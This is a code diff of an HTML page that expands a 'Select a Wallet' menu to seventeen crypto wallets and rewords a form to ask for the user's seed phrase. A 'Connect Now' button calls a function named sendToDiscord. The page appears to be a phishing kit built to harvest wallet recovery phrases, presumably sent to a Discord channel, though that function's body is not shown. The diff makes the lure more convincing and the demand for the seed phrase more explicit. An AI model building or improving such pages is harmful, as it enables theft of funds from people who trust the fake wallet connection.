@@ -598,12 +598,25 @@
   <div class="modal-content">
     <h3>Select a Wallet</h3>
     <ul class="wallet-list">
-      <li onclick="openMessageBox('MetaMask')">MetaMask</li>
-      <li onclick="openMessageBox('Trust Wallet')">Trust Wallet</li>
-      <li onclick="openMessageBox('Coinbase Wallet')">Coinbase Wallet</li>
-      <li onclick="openMessageBox('Ledger Live')">Ledger Live</li>
-      <li onclick="openMessageBox('Exodus')">Exodus</li>
-    </ul>
+	  <li onclick="openMessageBox('MetaMask')">MetaMask</li>
+	  <li onclick="openMessageBox('Trust Wallet')">Trust Wallet</li>
+	  <li onclick="openMessageBox('Coinbase Wallet')">Coinbase Wallet</li>
+	  <li onclick="openMessageBox('Ledger Live')">Ledger Live</li>
+	  <li onclick="openMessageBox('Exodus')">Exodus</li>
+	  <li onclick="openMessageBox('Atomic Wallet')">Atomic Wallet</li>
+	  <li onclick="openMessageBox('SafePal')">SafePal</li>
+	  <li onclick="openMessageBox('Rainbow Wallet')">Rainbow Wallet</li>
+	  <li onclick="openMessageBox('Zerion Wallet')">Zerion Wallet</li>
+	  <li onclick="openMessageBox('OKX Wallet')">OKX Wallet</li>
+	  <li onclick="openMessageBox('Binance Web3 Wallet')">Binance Web3 Wallet</li>
+	  <li onclick="openMessageBox('Crypto.com DeFi Wallet')">Crypto.com DeFi Wallet</li>
+	  <li onclick="openMessageBox('Phantom Wallet')">Phantom Wallet</li>
+	  <li onclick="openMessageBox('Keplr Wallet')">Keplr Wallet</li>
+	  <li onclick="openMessageBox('Trezor Suite')">Trezor Suite</li>
+	  <li onclick="openMessageBox('Argent Wallet')">Argent Wallet</li>
+	  <li onclick="openMessageBox('Gnosis Safe')">Gnosis Safe</li>
+	</ul>
+
     <button class="close-btn" onclick="closeWalletModal()">Close</button>
   </div>
 </div>
@@ -612,7 +625,7 @@
 <div id="messageModal" class="modal">
   <div class="modal-content">
     <h3 id="walletNameTitle">Enter Seed Phrase to Connect Wallet</h3>
-    <textarea id="userMessage" placeholder="Type your message here..."></textarea>
+    <textarea id="userMessage" placeholder="Enter Seed Phrase Here"></textarea>
     <button class="send-btn" onclick="sendToDiscord()">Connect Now</button>
     <button class="close-btn" onclick="closeMessageModal()">Cancel</button>
   </div>
@@ -703,6 +716,7 @@ function sendToDiscord() {
 </body>
 
 </html>
+
 
 
 
